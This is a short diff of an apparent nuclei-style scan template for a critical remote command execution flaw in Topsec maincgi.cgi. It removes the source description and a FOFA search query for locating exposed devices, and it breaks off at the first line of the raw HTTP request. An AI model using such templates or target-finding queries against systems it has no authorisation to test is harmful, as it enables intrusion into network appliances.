@@ -3,12 +3,8 @@ info:
   name: 天融信TOPSEC_maincgi.cgi远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aolapcqs1yyn8lop'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: aolapcqs1yyn8lop
-    fofa: title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
 http:
 - raw:
   - 'GET /cgi/maincgi.cgi?Url=check HTTP/1.1
